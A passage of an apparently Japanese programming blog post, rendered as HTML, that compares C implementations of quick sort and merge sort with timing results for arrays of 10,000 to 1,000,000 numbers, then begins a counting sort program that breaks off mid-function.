  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tmp</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Error occurred on fscanf()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span> 
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">quick_sort</span><span class="p">(</span><span class="kt">long</span> <span class="n">x</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">left</span><span class="p">,</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">right</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">pivot</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
  <span class="n">pivot</span> <span class="o">=</span> <span class="n">x</span><span class="p">[(</span><span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">];</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">left</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="n">right</span><span class="p">;</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">,</span> <span class="n">j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">pivot</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">i</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">pivot</span> <span class="o">&lt;</span> <span class="n">x</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="p">{</span>
      <span class="n">j</span><span class="o">--</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="n">j</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">swap</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">left</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">quick_sort</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">left</span><span class="p">,</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">right</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">quick_sort</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">right</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">count</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">score</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"count = "</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">count</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">array</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="o">*</span> <span class="n">count</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">set_array</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"[Before]:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">print_r</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">quick_sort</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"[After]:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">print_r</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="p">;</span>
    <span class="n">sum</span> <span class="o">+=</span> <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Time[%d]: %ld[msec]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Average: %ld[msec]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sum</span> <span class="o">/</span> <span class="mi">10</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="results-1" class="fragment"></span><a href="#results-1"><i class="fa fa-link"></i></a>Results</h2>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">10000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 1[msec]
Time[1]: 1[msec]
Time[2]: 1[msec]
Time[3]: 1[msec]
Time[4]: 1[msec]
Time[5]: 1[msec]
Time[6]: 1[msec]
Time[7]: 1[msec]
Time[8]: 1[msec]
Time[9]: 2[msec]

Average: 1[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">50000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 9[msec]
Time[1]: 7[msec]
Time[2]: 6[msec]
Time[3]: 6[msec]
Time[4]: 6[msec]
Time[5]: 6[msec]
Time[6]: 6[msec]
Time[7]: 6[msec]
Time[8]: 6[msec]
Time[9]: 6[msec]

Average: 6[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">100000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 13[msec]
Time[1]: 12[msec]
Time[2]: 12[msec]
Time[3]: 13[msec]
Time[4]: 12[msec]
Time[5]: 12[msec]
Time[6]: 12[msec]
Time[7]: 12[msec]
Time[8]: 12[msec]
Time[9]: 12[msec]

Average: 12[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">500000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 70[msec]
Time[1]: 71[msec]
Time[2]: 72[msec]
Time[3]: 72[msec]
Time[4]: 71[msec]
Time[5]: 75[msec]
Time[6]: 72[msec]
Time[7]: 71[msec]
Time[8]: 71[msec]
Time[9]: 72[msec]

Average: 71[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">1000000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 148[msec]
Time[1]: 148[msec]
Time[2]: 151[msec]
Time[3]: 149[msec]
Time[4]: 149[msec]
Time[5]: 148[msec]
Time[6]: 152[msec]
Time[7]: 149[msec]
Time[8]: 150[msec]
Time[9]: 150[msec]

Average: 149[msec]
</pre></div>
</div>

<h1>
<span id="merge-sort" class="fragment"></span><a href="#merge-sort"><i class="fa fa-link"></i></a>Merge Sort</h1>

<h2>
<span id="code-3" class="fragment"></span><a href="#code-3"><i class="fa fa-link"></i></a>Code</h2>

<div class="code-frame" data-lang="c">
<div class="code-lang"><span class="bold">MergeSort.c</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">print_r</span><span class="p">(</span><span class="k">const</span> <span class="kt">long</span> <span class="n">x</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span> 
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">set_array</span><span class="p">(</span><span class="kt">long</span> <span class="n">array</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">count</span><span class="p">,</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">index</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">tmp</span><span class="p">;</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"data/%ld/%ld-%d"</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Can't open </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"\n</span><span class="s">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tmp</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Error occurred on fscanf()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span> 
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">merge_sort</span><span class="p">(</span><span class="kt">long</span> <span class="n">x</span><span class="p">[],</span> <span class="kt">long</span> <span class="n">y</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">left</span><span class="p">,</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">right</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">mid</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">k</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">left</span> <span class="o">&gt;=</span> <span class="n">right</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
  <span class="n">merge_sort</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">left</span><span class="p">,</span> <span class="n">mid</span><span class="p">);</span>
  <span class="n">merge_sort</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">right</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">left</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">mid</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="n">right</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">right</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">,</span> <span class="n">j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="n">i</span> <span class="o">=</span> <span class="n">left</span><span class="p">;</span>
  <span class="n">j</span> <span class="o">=</span> <span class="n">right</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">k</span> <span class="o">=</span> <span class="n">left</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;=</span> <span class="n">right</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">y</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="p">{</span>
      <span class="n">x</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">];</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">x</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">y</span><span class="p">[</span><span class="n">j</span><span class="o">--</span><span class="p">];</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">copy</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">count</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">score</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"count = "</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">count</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">array</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="o">*</span> <span class="n">count</span><span class="p">);</span>
  <span class="n">copy</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="o">*</span> <span class="n">count</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">set_array</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"[Before]:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">print_r</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">merge_sort</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">copy</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"[After]:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">print_r</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="p">;</span>
    <span class="n">sum</span> <span class="o">+=</span> <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Time[%d]: %ld[msec]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Average: %ld[msec]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sum</span> <span class="o">/</span> <span class="mi">10</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">copy</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="results-2" class="fragment"></span><a href="#results-2"><i class="fa fa-link"></i></a>Results</h2>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">10000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 1[msec]
Time[1]: 1[msec]
Time[2]: 2[msec]
Time[3]: 1[msec]
Time[4]: 1[msec]
Time[5]: 2[msec]
Time[6]: 1[msec]
Time[7]: 1[msec]
Time[8]: 1[msec]
Time[9]: 2[msec]

Average: 1[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">50000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 8[msec]
Time[1]: 8[msec]
Time[2]: 8[msec]
Time[3]: 7[msec]
Time[4]: 8[msec]
Time[5]: 9[msec]
Time[6]: 8[msec]
Time[7]: 7[msec]
Time[8]: 8[msec]
Time[9]: 7[msec]

Average: 7[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">100000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 17[msec]
Time[1]: 16[msec]
Time[2]: 16[msec]
Time[3]: 16[msec]
Time[4]: 16[msec]
Time[5]: 16[msec]
Time[6]: 16[msec]
Time[7]: 16[msec]
Time[8]: 16[msec]
Time[9]: 16[msec]

Average: 16[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">500000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 93[msec]
Time[1]: 93[msec]
Time[2]: 92[msec]
Time[3]: 93[msec]
Time[4]: 93[msec]
Time[5]: 92[msec]
Time[6]: 93[msec]
Time[7]: 93[msec]
Time[8]: 93[msec]
Time[9]: 92[msec]

Average: 92[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">1000000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 195[msec]
Time[1]: 195[msec]
Time[2]: 194[msec]
Time[3]: 199[msec]
Time[4]: 198[msec]
Time[5]: 195[msec]
Time[6]: 198[msec]
Time[7]: 201[msec]
Time[8]: 194[msec]
Time[9]: 193[msec]

Average: 196[msec]
</pre></div>
</div>

<h1>
<span id="counting-sort" class="fragment"></span><a href="#counting-sort"><i class="fa fa-link"></i></a>Counting Sort</h1>

<h2>
<span id="code-4" class="fragment"></span><a href="#code-4"><i class="fa fa-link"></i></a>Code</h2>

<div class="code-frame" data-lang="c">
<div class="code-lang"><span class="bold">CountingSort.c</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp"></span>

<span class="cp">#define MAX 999999</span>

<span class="kt">void</span> <span class="nf">print_r</span><span class="p">(</span><span class="k">const</span> <span class="kt">long</span> <span class="n">x</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span> 
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">set_array</span><span class="p">(</span><span class="kt">long</span> <span class="n">array</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">count</span><span class="p">,</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">index</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">tmp</span><span class="p">;</span>
